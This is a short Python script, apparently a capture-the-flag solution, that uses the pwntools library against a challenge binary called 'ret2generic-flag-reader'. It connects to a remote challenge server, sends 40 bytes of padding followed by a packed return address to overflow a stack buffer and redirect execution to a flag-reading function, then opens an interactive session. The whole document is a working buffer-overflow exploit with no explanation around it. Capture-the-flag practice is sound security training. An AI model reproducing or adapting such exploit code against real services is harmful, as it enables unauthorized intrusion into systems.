from pwn import *
#p = process("./ret2generic-flag-reader")
p = remote('mc.ax', 31077)
x = p.recv()

p.sendline("A"*40 + p64(0x4011f6))
p.interactive()


